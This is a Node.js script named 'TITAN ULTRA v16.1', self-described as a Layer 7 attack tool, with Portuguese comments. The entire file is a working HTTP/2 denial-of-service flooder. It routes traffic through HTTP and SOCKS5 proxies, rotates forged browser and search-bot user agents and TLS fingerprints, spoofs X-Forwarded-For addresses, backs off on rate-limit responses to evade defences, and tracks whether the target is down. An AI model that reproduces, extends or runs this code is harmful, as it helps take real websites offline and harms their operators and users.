#!/usr/bin/env node

/**
 * TITAN ULTRA v16.1 - Ultimate Layer 7 Attack Tool
 * Features:
 * - Dynamic UA generation (realistic fingerprints)
 * - Multi-ALPN support (h2, http/1.1, h3, quic)
 * - HTTP methods + random bodies (POST, PUT, PATCH)
 * - Advanced browser headers (Sec-Fetch, Upgrade-Insecure)
 * - TLS fingerprinting with cipher/curve variation
 * - Dynamic rate limiting on 429/503
 * - Target health check (ONLINE/DOWN) using GET
 * - SOCKS5 proxy support (auto-detect)
 * - Persistent sessions (60s) with request limit
 * - HTTP/1.1 fallback if ALPN != h2
 * - Optimized async loop with rate control
 * - Parametric flooders per worker
 * - Enhanced visual dashboard with progress bar
 */

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const dns = require("dns");
const http = require("http");
const https = require("https");
const socks = require("socks").SocksClient;

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ========== CONFIGURAÇÕES ==========
const CONFIG = {
    MAX_RETRIES: 3,
    CONNECTION_TIMEOUT: 5000,
    SESSION_LIFETIME: 60000,        // 60s por sessão
    MAX_REQUESTS_PER_SESSION: 1000,  // Limite de requests por sessão
    PROXY_BACKOFF: 60000,           // 60s de pausa para proxies com erro
    INITIAL_WINDOW_SIZE: 1073741824,
    MAX_CONCURRENT_STREAMS: 5000,
    ALPN_PROTOCOLS: ["h2", "http/1.1", "h3", "http/2+quic/43", "http/2+quic/44"],
    // Base para geração de UAs realistas
    UA_TEMPLATES: [
        { platform: "Windows", browser: "Chrome", version: "120.0.0.0", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36" },
        { platform: "Windows", browser: "Chrome", version: "119.0.0.0", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36" },
        { platform: "Windows", browser: "Edge", version: "120.0.0.0", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36 Edg/%VER%" },
        { platform: "Windows", browser: "Firefox", version: "121.0", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%VER%) Gecko/20100101 Firefox/%VER%" },
        { platform: "macOS", browser: "Chrome", version: "120.0.0.0", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36" },
        { platform: "macOS", browser: "Safari", version: "17.2", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%VER% Safari/605.1.15" },
        { platform: "Linux", browser: "Chrome", version: "120.0.0.0", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Safari/537.36" },
        { platform: "Linux", browser: "Firefox", version: "121.0", ua: "Mozilla/5.0 (X11; Linux x86_64; rv:%VER%) Gecko/20100101 Firefox/%VER%" },
        { platform: "iOS", browser: "Safari", version: "17.2", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%VER% Mobile/15E148 Safari/604.1" },
        { platform: "Android", browser: "Chrome", version: "120.0.0.0", ua: "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%VER% Mobile Safari/537.36" },
        { platform: "Bot", browser: "Googlebot", version: "2.1", ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
        { platform: "Bot", browser: "Bingbot", version: "2.0", ua: "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)" }
    ],
    CIPHER_LIST: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384"
    ],
    ECDH_CURVES: ["x25519", "secp256r1", "secp384r1", "secp521r1"],
    METHODS: ["GET", "POST", "PUT", "PATCH", "DELETE"],
    PATHS: [
        "/", "/index.html", "/wp-admin", "/api/v1/users", "/auth/login",
        "/cart", "/checkout", "/search", "/dashboard", "/admin"
    ]
};

// ========== ARGUMENTOS ==========
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt",
    flooders: process.argv[7] ? ~~process.argv[7] : 16,
    socks5: process.argv.includes("--socks5")
};

if (!args.target || !args.time || !args.rate || !args.threads) {
    console.log(`
\x1b[1;36m  ████████╗██╗████████╗ █████╗ ███╗   ██╗
\x1b[1;35m  ╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║
\x1b[1;34m     ██║   ██║   ██║   ███████║██╔██╗ ██║
\x1b[1;33m     ██║   ██║   ██║   ██╔══██║██║╚██╗██║
\x1b[1;32m     ██║   ██║   ██║   ██║  ██║██║ ╚████║
\x1b[1;31m     ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
\x1b[0m
\x1b[1;37mTITAN ULTRA v16.1 - Ultimate Attack Tool\x1b[0m
\x1b[1;30m─────────────────────────────────────────────────\x1b[0m
\x1b[1;37mUsage:\x1b[0m node titan-ultra.js <url> <time> <rate> <threads> [proxyfile] [flooders] [--socks5]
\x1b[1;37mExample:\x1b[0m node titan-ultra.js https://example.com 60 500 4 proxy.txt 16 --socks5
`);
    process.exit();
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.trim().length > 5 && l.includes(':'));

if (proxies.length === 0) {
    console.error("\x1b[1;31m❌ Nenhuma proxy válida encontrada.\x1b[0m");
    process.exit();
}

const targetPort = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);

// ========== GERADOR DE USER-AGENT ==========
class UAGenerator {
    constructor() {
        this.templates = CONFIG.UA_TEMPLATES;
        this.cache = [];
        this.refreshCache();
    }

    refreshCache() {
        this.cache = [];
        for (let i = 0; i < 500; i++) {
            const template = this.templates[Math.floor(Math.random() * this.templates.length)];
            let ua = template.ua.replace('%VER%', template.version);
            if (template.browser === 'Chrome') {
                const major = parseInt(template.version.split('.')[0]);
                const minor = Math.floor(Math.random() * 99);
                const build = Math.floor(Math.random() * 9999);
                const patch = Math.floor(Math.random() * 999);
                ua = ua.replace('%VER%', `${major}.${minor}.${build}.${patch}`);
            } else if (template.browser === 'Firefox') {
                const major = parseInt(template.version);
                const minor = Math.floor(Math.random() * 9);
                ua = ua.replace('%VER%', `${major}.${minor}`);
            } else if (template.browser === 'Safari') {
                const ver = template.version.split('.');
                const major = ver[0];
                const minor = Math.floor(Math.random() * 9);
                ua = ua.replace('%VER%', `${major}.${minor}`);
            } else {
                ua = ua.replace('%VER%', template.version);
            }
            if (template.platform === 'Windows') {
                const winVer = Math.random() > 0.5 ? '10.0' : '11.0';
                ua = ua.replace('Windows NT 10.0', `Windows NT ${winVer}`);
            }
            this.cache.push(ua);
        }
    }

    getRandom() {
        if (this.cache.length === 0) this.refreshCache();
        return this.cache[Math.floor(Math.random() * this.cache.length)];
    }
}

const uaGen = new UAGenerator();

// ========== UTILITÁRIOS ==========
function random(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function formatNum(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n.toString();
}
function randomIP() { return `${rand(1,255)}.${rand(1,255)}.${rand(1,255)}.${rand(1,255)}`; }
function randomPath() {
    const base = random(CONFIG.PATHS);
    return base + '?' + crypto.randomBytes(4).toString('hex');
}

// ========== MASTER ==========
if (cluster.isMaster) {
    let totalSent = 0, rps = 0, targetIp = "Resolvendo...", targetStatus = "🟢 ONLINE";
    const statusCodes = {}, onlineProxies = new Set(), proxyHits = {};
    const startTime = Date.now();

    dns.lookup(parsedTarget.hostname, (err, addr) => { if (!err) targetIp = addr; });

    // Health check do alvo usando GET (agora em vez de HEAD)
    function checkTargetStatus() {
        const options = {
            hostname: parsedTarget.hostname,
            port: targetPort,
            path: '/',
            method: 'GET',  // <-- ALTERADO DE HEAD PARA GET
            timeout: 3000
        };
        const requester = parsedTarget.protocol === 'https:' ? https : http;
        const req = requester.request(options, (res) => {
            targetStatus = res.statusCode < 500 ? '🟢 ONLINE' : '🔴 DOWN';
        });
        req.on('error', () => { targetStatus = '🔴 DOWN'; });
        req.end();
    }
    setInterval(checkTargetStatus, 5000);
    setTimeout(checkTargetStatus, 1000);

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const remaining = Math.max(0, args.time - elapsed);
        const progress = Math.min(100, (elapsed / args.time) * 100);
        const bar = '█'.repeat(Math.floor(progress / 5)) + '░'.repeat(20 - Math.floor(progress / 5));

        console.clear();
        console.log(`\x1b[1;36m  ████████╗██╗████████╗ █████╗ ███╗   ██╗\x1b[0m`);
        console.log(`\x1b[1;35m  ╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║\x1b[0m`);
        console.log(`\x1b[1;34m     ██║   ██║   ██║   ███████║██╔██╗ ██║\x1b[0m`);
        console.log(`\x1b[1;33m     ██║   ██║   ██║   ██╔══██║██║╚██╗██║\x1b[0m`);
        console.log(`\x1b[1;32m     ██║   ██║   ██║   ██║  ██║██║ ╚████║\x1b[0m`);
        console.log(`\x1b[1;31m     ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝\x1b[0m`);
        console.log(`\x1b[1;37m  TITAN ULTRA v16.1 - TARGET: ${parsedTarget.hostname} (${targetIp})\x1b[0m`);
        console.log(`\x1b[1;30m  ─────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  DURATION: \x1b[1;33m${elapsed}s / ${args.time}s\x1b[0m   REMAINING: \x1b[1;33m${remaining}s\x1b[0m`);
        console.log(`\x1b[1;37m  PROGRESS: \x1b[1;32m[${bar}]\x1b[0m  ${progress.toFixed(1)}%`);
        console.log(`\x1b[1;30m  ─────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  TARGET STATUS: \x1b[1;${targetStatus.includes('ONLINE') ? '32' : '31'}m${targetStatus}\x1b[0m`);
        console.log(`\x1b[1;37m  SENT: \x1b[1;31m${formatNum(totalSent).padEnd(10)}\x1b[0m  RPS: \x1b[1;32m${formatNum(rps).padEnd(10)}\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;33m${onlineProxies.size}\x1b[0m`);
        console.log(`\x1b[1;30m  ─────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  STATUS CODES:\x1b[0m`);
        const sorted = Object.entries(statusCodes).sort((a,b) => b[1]-a[1]);
        sorted.slice(0, 8).forEach(([code, count]) => {
            const color = code.startsWith('2') ? '\x1b[1;32m' : '\x1b[1;31m';
            console.log(`  ${color}${code}\x1b[1;37m: ${formatNum(count)}\x1b[0m`);
        });
        console.log(`\x1b[1;30m  ─────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  TOP 5 PROXIES:\x1b[0m`);
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0,5).forEach(([ip, hits]) => {
            console.log(`  \x1b[1;30m> \x1b[1;31m${ip.padEnd(15)}\x1b[1;30m ─ \x1b[1;37m${formatNum(hits)}\x1b[0m`);
        });
        console.log(`\x1b[1;30m  ─────────────────────────────────────────────────\x1b[0m`);
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'stats') {
            totalSent += msg.sent;
            rps += msg.sent;
            if (msg.proxyIP) {
                onlineProxies.add(msg.proxyIP);
                proxyHits[msg.proxyIP] = (proxyHits[msg.proxyIP] || 0) + msg.sent;
            }
            Object.keys(msg.codes).forEach(c => {
                statusCodes[c] = (statusCodes[c] || 0) + msg.codes[c];
            });
        }
    });

    setTimeout(() => {
        console.clear();
        console.log(`\x1b[1;31m═══════════════════════════════════════════════════\x1b[0m`);
        console.log(`\x1b[1;37m  ATAQUE FINALIZADO!\x1b[0m`);
        console.log(`\x1b[1;37m  TOTAL ENVIADO: \x1b[1;32m${formatNum(totalSent)}\x1b[0m`);
        console.log(`\x1b[1;37m  STATUS FINAL: \x1b[1;33m${targetStatus}\x1b[0m`);
        console.log(`\x1b[1;31m═══════════════════════════════════════════════════\x1b[0m`);
        process.exit(0);
    }, args.time * 1000);

} else {
    // ========== WORKER ==========
    let workerSent = 0, workerCodes = {};
    const failedProxies = {};
    let originalRate = args.rate;
    let currentRate = originalRate;

    setInterval(() => {
        if (workerSent > 0) {
            process.send({ type: 'stats', sent: workerSent, codes: workerCodes, proxyIP: null });
            workerSent = 0;
            workerCodes = {};
        }
    }, 500);

    for (let i = 0; i < args.flooders; i++) {
        setImmediate(runFlooder);
    }

    function getProxy() {
        const now = Date.now();
        const available = proxies.filter(proxy => {
            const [ip] = proxy.split(':');
            if (failedProxies[ip] && failedProxies[ip] > now) return false;
            return true;
        });
        if (available.length === 0) return null;
        return random(available);
    }

    function markProxyFailed(ip) {
        failedProxies[ip] = Date.now() + CONFIG.PROXY_BACKOFF;
    }

    function runFlooder() {
        const proxyRaw = getProxy();
        if (!proxyRaw) return setTimeout(runFlooder, 500);
        const [pHost, pPort] = proxyRaw.split(':');
        const proxyType = args.socks5 || parseInt(pPort) === 1080 ? 'socks5' : 'http';

        let attempts = 0;
        const connect = () => {
            attempts++;
            if (attempts > CONFIG.MAX_RETRIES) {
                markProxyFailed(pHost);
                return setTimeout(runFlooder, 1000);
            }

            let socket;
            if (proxyType === 'socks5') {
                socks.createConnection({
                    proxy: { host: pHost, port: parseInt(pPort), type: 5 },
                    command: 'connect',
                    destination: { host: parsedTarget.hostname, port: 443 }
                }, (err, info) => {
                    if (err) return setTimeout(connect, 1000);
                    socket = info.socket;
                    onSocketReady(socket);
                });
                return;
            } else {
                socket = net.createConnection({ host: pHost, port: parseInt(pPort) });
                socket.setTimeout(CONFIG.CONNECTION_TIMEOUT);

                socket.once("connect", () => {
                    socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
                });

                socket.once("data", (d) => {
                    if (!d.toString().includes("200")) {
                        socket.destroy();
                        markProxyFailed(pHost);
                        return setTimeout(runFlooder, 1000);
                    }
                    onSocketReady(socket);
                });

                socket.on("error", () => {
                    socket.destroy();
                    markProxyFailed(pHost);
                    setTimeout(runFlooder, 1000);
                });
            }
        };

        function onSocketReady(socket) {
            const cipher = random(CONFIG.CIPHER_LIST);
            const curve = random(CONFIG.ECDH_CURVES);

            const tlsConn = tls.connect({
                socket, servername: parsedTarget.hostname,
                ALPNProtocols: CONFIG.ALPN_PROTOCOLS,
                ciphers: cipher,
                ecdhCurve: curve,
                rejectUnauthorized: false
            }, () => {
                // Fallback para HTTP/1.1 se ALPN não for h2
                if (tlsConn.alpnProtocol !== 'h2') {
                    // Usar HTTP/1.1 via socket raw
                    const req = `GET / HTTP/1.1\r\nHost: ${parsedTarget.hostname}\r\nConnection: keep-alive\r\n\r\n`;
                    socket.write(req);
                    // Não faremos mais nada com essa conexão
                    setTimeout(() => {
                        socket.destroy();
                        setTimeout(runFlooder, 100);
                    }, 1000);
                    return;
                }

                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsConn,
                    settings: {
                        initialWindowSize: CONFIG.INITIAL_WINDOW_SIZE,
                        maxConcurrentStreams: CONFIG.MAX_CONCURRENT_STREAMS
                    }
                });

                let sessionRequests = 0;
                let batchSent = 0, batchCodes = {};
                let isActive = true;
                let lastSecond = Date.now();
                let requestsThisSecond = 0;

                function sendLoop() {
                    if (!isActive || client.destroyed) return;
                    if (sessionRequests >= CONFIG.MAX_REQUESTS_PER_SESSION) {
                        isActive = false;
                        client.destroy();
                        socket.destroy();
                        setTimeout(runFlooder, 100);
                        return;
                    }

                    // Controle de taxa por segundo
                    const now = Date.now();
                    if (now - lastSecond >= 1000) {
                        requestsThisSecond = 0;
                        lastSecond = now;
                    }
                    if (requestsThisSecond >= currentRate) {
                        setImmediate(sendLoop);
                        return;
                    }

                    const method = random(CONFIG.METHODS);
                    const ua = uaGen.getRandom();
                    const headers = {
                        ":method": method,
                        ":path": randomPath(),
                        ":scheme": "https",
                        ":authority": parsedTarget.hostname,
                        "user-agent": ua,
                        "accept": "*/*",
                        "accept-language": "pt-BR,pt;q=0.9",
                        "cache-control": "no-cache",
                        "x-forwarded-for": randomIP(),
                        "referer": `https://${parsedTarget.hostname}/`,
                        "upgrade-insecure-requests": "1",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": random(["same-origin", "cross-site"]),
                        "sec-fetch-user": "?1"
                    };

                    const req = client.request(headers);
                    if (['POST', 'PUT', 'PATCH'].includes(method)) {
                        const body = crypto.randomBytes(rand(512, 4096));
                        req.write(body);
                    }

                    req.on("response", (res) => {
                        const sc = res[":status"];
                        // Ajuste dinâmico de taxa
                        if ((sc === 429 || sc === 503) && currentRate > 50) {
                            currentRate = Math.floor(currentRate / 2);
                            setTimeout(() => {
                                currentRate = Math.min(originalRate, Math.floor(currentRate * 1.5));
                            }, 5000);
                        }
                        batchSent++;
                        batchCodes[sc] = (batchCodes[sc] || 0) + 1;
                        req.close();
                        req.destroy();
                    });
                    req.on("error", () => {
                        req.close();
                        req.destroy();
                    });
                    req.end();

                    sessionRequests++;
                    requestsThisSecond++;

                    setImmediate(sendLoop);
                }

                sendLoop();

                const reportInterval = setInterval(() => {
                    if (batchSent > 0) {
                        workerSent += batchSent;
                        Object.keys(batchCodes).forEach(c => workerCodes[c] = (workerCodes[c] || 0) + batchCodes[c]);
                        process.send({ type: 'stats', sent: batchSent, codes: batchCodes, proxyIP: pHost });
                        batchSent = 0; batchCodes = {};
                    }
                }, 100);

                setTimeout(() => {
                    isActive = false;
                    clearInterval(reportInterval);
                    client.destroy();
                    socket.destroy();
                    setTimeout(runFlooder, 100);
                }, CONFIG.SESSION_LIFETIME);
            });

            tlsConn.on("error", () => {
                client.destroy();
                socket.destroy();
                markProxyFailed(pHost);
            });
        }

        connect();
    }
}

// ========== FIM ==========
